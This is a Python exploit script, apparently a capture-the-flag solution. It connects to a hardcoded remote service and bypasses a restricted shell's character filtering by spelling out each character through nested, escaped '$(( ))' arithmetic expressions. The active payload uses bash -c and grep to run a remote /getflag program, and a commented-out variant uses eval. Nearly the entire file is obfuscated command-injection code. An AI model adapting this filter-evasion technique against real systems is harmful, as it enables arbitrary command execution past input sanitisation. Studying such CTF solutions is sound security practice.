import socket
import telnetlib
from struct import pack, unpack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

def go():
    sock = gsocket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.recvuntil(r"(make sure to try 'thisfile')")


    eq   = r'\$echoecho'
    plus = r'\$echoecho'
    obr  = r'\$echoechoecho'
    zbr  = r'\$echoechoechoecho'
    dol  = r'\$echoechoechoechoecho'
    amp  = r'\$echoechoechoechoechoecho'
    bsl  = r'\$echoechoechoechoechoechoecho'
    v_8  = r' $$'
    v_10 = r'\$\$'
    v_11 = r'\\$\\$'

    equat_154 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_155 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_144 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_134 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_156 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_145 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_146 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_166 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 +  plus + v_10 + plus + v_10
    equat_147 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_151 = v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_150 = v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_160 = v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_170 = v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_141 = v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_142 = v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_163 = v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_164 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_167 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_157 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_137 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_143 = v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_57  = v_11 + plus + v_10 + plus + v_8  + plus + v_8  + plus + v_10 + plus + v_10
    equat_74  = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10
    equat_46  = v_10 + plus + v_10 + plus + v_8  + plus + v_8  + plus + v_10
    equat_47  = v_10 + plus + v_10 + plus + v_8  + plus + v_8  + plus + v_11
    equat_52  = v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10
    equat_42  = v_11 + plus + v_11 + plus + v_10 + plus + v_10
    equat_55  = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11
    equat_50  = v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_51  = v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_61  = v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_174 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_73  = v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_165 = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_162 = v_11 + plus + v_11 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10 + plus + v_10
    equat_44  = v_11 + plus + v_11 + plus + v_11 + plus + v_11
    equat_53  = v_11 + plus + v_11 + plus + v_11 + plus + v_10 + plus + v_10
    equat_76  = v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_11 + plus + v_10

    expr_166 = dol + obr + obr + equat_166 + zbr + zbr
    expr_42  = dol + obr + obr + equat_42 + zbr + zbr
    expr_154 = dol + obr + obr + equat_154 + zbr + zbr
    expr_155 = dol + obr + obr + equat_155 + zbr + zbr
    expr_144 = dol + obr + obr + equat_144 + zbr + zbr
    expr_134 = dol + obr + obr + equat_134 + zbr + zbr
    expr_156 = dol + obr + obr + equat_156 + zbr + zbr
    expr_145 = dol + obr + obr + equat_145 + zbr + zbr
    expr_147 = dol + obr + obr + equat_147 + zbr + zbr
    expr_151 = dol + obr + obr + equat_151 + zbr + zbr
    expr_150 = dol + obr + obr + equat_150 + zbr + zbr
    expr_143 = dol + obr + obr + equat_143 + zbr + zbr
    expr_142 = dol + obr + obr + equat_142 + zbr + zbr
    expr_141 = dol + obr + obr + equat_141 + zbr + zbr
    expr_170 = dol + obr + obr + equat_170 + zbr + zbr
    expr_163 = dol + obr + obr + equat_163 + zbr + zbr
    expr_164 = dol + obr + obr + equat_164 + zbr + zbr
    expr_167 = dol + obr + obr + equat_167 + zbr + zbr
    expr_157 = dol + obr + obr + equat_157 + zbr + zbr
    expr_137 = dol + obr + obr + equat_137 + zbr + zbr
    expr_57  = dol + obr + obr + equat_57  + zbr + zbr
    expr_74  = dol + obr + obr + equat_74  + zbr + zbr
    expr_46  = dol + obr + obr + equat_46  + zbr + zbr
    expr_47  = dol + obr + obr + equat_47  + zbr + zbr
    expr_52  = dol + obr + obr + equat_52  + zbr + zbr
    expr_55  = dol + obr + obr + equat_55  + zbr + zbr
    expr_50  = dol + obr + obr + equat_50  + zbr + zbr
    expr_51  = dol + obr + obr + equat_51  + zbr + zbr
    expr_61  = dol + obr + obr + equat_61  + zbr + zbr
    expr_146 = dol + obr + obr + equat_146 + zbr + zbr
    expr_174 = dol + obr + obr + equat_174 + zbr + zbr
    expr_73  = dol + obr + obr + equat_73  + zbr + zbr
    expr_160 = dol + obr + obr + equat_160 + zbr + zbr
    expr_165 = dol + obr + obr + equat_165 + zbr + zbr
    expr_162 = dol + obr + obr + equat_162 + zbr + zbr
    expr_44  = dol + obr + obr + equat_44  + zbr + zbr
    expr_53  = dol + obr + obr + equat_53  + zbr + zbr
    expr_76  = dol + obr + obr + equat_76  + zbr + zbr

    v  = bsl + dol + bsl + amp + bsl + bsl + expr_166 + bsl + amp
    cd = bsl + dol + bsl + amp + bsl + bsl + expr_42 + bsl + amp
    u  = bsl + dol + bsl + amp + bsl + bsl + expr_165 + bsl + amp
    r  = bsl + dol + bsl + amp + bsl + bsl + expr_162 + bsl + amp
    dl = bsl + dol + bsl + amp + bsl + bsl + expr_44 + bsl + amp
    pl = bsl + dol + bsl + amp + bsl + bsl + expr_53 + bsl + amp
    gt = bsl + dol + bsl + amp + bsl + bsl + expr_76 + bsl + amp
    mi = bsl + dol + bsl + amp + bsl + bsl + expr_55 + bsl + amp
    ob = bsl + dol + bsl + amp + bsl + bsl + expr_50 + bsl + amp
    cb = bsl + dol + bsl + amp + bsl + bsl + expr_51 + bsl + amp
    pi = bsl + dol + bsl + amp + bsl + bsl + expr_174 + bsl + amp
    sr = bsl + dol + bsl + amp + bsl + bsl + expr_73 + bsl + amp
    x  = bsl + dol + bsl + amp + bsl + bsl + expr_170 + bsl + amp
    l  = bsl + dol + bsl + amp + bsl + bsl + expr_154 + bsl + amp
    s  = bsl + dol + bsl + amp + bsl + bsl + expr_163 + bsl + amp
    b  = bsl + dol + bsl + amp + bsl + bsl + expr_142 + bsl + amp
    i  = bsl + dol + bsl + amp + bsl + bsl + expr_151 + bsl + amp
    n  = bsl + dol + bsl + amp + bsl + bsl + expr_156 + bsl + amp
    a  = bsl + dol + bsl + amp + bsl + bsl + expr_141 + bsl + amp
    c  = bsl + dol + bsl + amp + bsl + bsl + expr_143 + bsl + amp
    t  = bsl + dol + bsl + amp + bsl + bsl + expr_164 + bsl + amp
    one= bsl + dol + bsl + amp + bsl + bsl + expr_61 + bsl + amp
    e  = bsl + dol + bsl + amp + bsl + bsl + expr_145 + bsl + amp
    g  = bsl + dol + bsl + amp + bsl + bsl + expr_147 + bsl + amp
    h  = bsl + dol + bsl + amp + bsl + bsl + expr_150 + bsl + amp
    o  = bsl + dol + bsl + amp + bsl + bsl + expr_157 + bsl + amp
    m  = bsl + dol + bsl + amp + bsl + bsl + expr_155 + bsl + amp
    p  = bsl + dol + bsl + amp + bsl + bsl + expr_160 + bsl + amp
    w  = bsl + dol + bsl + amp + bsl + bsl + expr_167 + bsl + amp
    d  = bsl + dol + bsl + amp + bsl + bsl + expr_144 + bsl + amp
    fl = bsl + dol + bsl + amp + bsl + bsl + expr_137 + bsl + amp
    sl = bsl + dol + bsl + amp + bsl + bsl + expr_57 + bsl + amp
    f  = bsl + dol + bsl + amp + bsl + bsl + expr_146 + bsl + amp
    rsl= bsl + dol + bsl + amp + bsl + bsl + expr_134 + bsl + amp
    st = bsl + dol + bsl + amp + bsl + bsl + expr_52 + bsl + amp
    an = bsl + dol + bsl + amp + bsl + bsl + expr_46 + bsl + amp
    lt = bsl + dol + bsl + amp + bsl + bsl + expr_74 + bsl + amp
    am = bsl + dol + bsl + amp + bsl + bsl + expr_47 + bsl + amp

    prolog  = r"echoecho=\=;echo echoecho$echoecho\\\+ echoechoecho$echoecho\\\( echoechoechoecho$echoecho\\\) echoechoechoechoecho$echoecho\$ echoechoechoechoechoecho$echoecho\\\' echoechoechoechoechoechoecho$echoecho\\\\\; echo echo echo "

    #payload = prolog + sl+g+e+t+fl+f+l+a+g

    payload = prolog + b+a+s+h+' '+mi+c+' '+am+e+x+p+r+' '+dl+ob+g+r+e+p+' '+ one + ' '+sl+t+m+p+sl+f+o+o+b+a+r+b+a+x+cb+am+pi+sl+g+e+t+fl+f+l+a+g+' '+gt+sl+t+m+p+sl+f+o+o+b+a+r+b+a+x
    #payload = prolog+e+v+a+l +' '+cd+e+c+h+o+' '+bsl+dl+ob+ob+dl+ob+c+a+t+' '+sl+t+m+p+sl+a+cb+cb+cb+cd+pi+sl+g+e+t+fl+f+l+a+g+pi+ob+r+e+a+d+' '+l+sr +r+e+a+d+' '+l+sr+e+c+h+o+' '+dl+l+gt+sl+t+m+p+sl+a+sr+c+a+t+sr+cb
    reps = "3"

    print("going to send: " + payload)

    sock.sendall(payload + '\n')
    print(sock.recvuntil('\n'))
    print(sock.recvuntil('\n'))

    sock.sendall(reps + '\n')

    while True:
        line = sock.recvuntil('\n')
        if line is False:
            break
        print line[:-1]

    sock.close()


HOST = "35.246.181.187"
PORT = 1337
go()




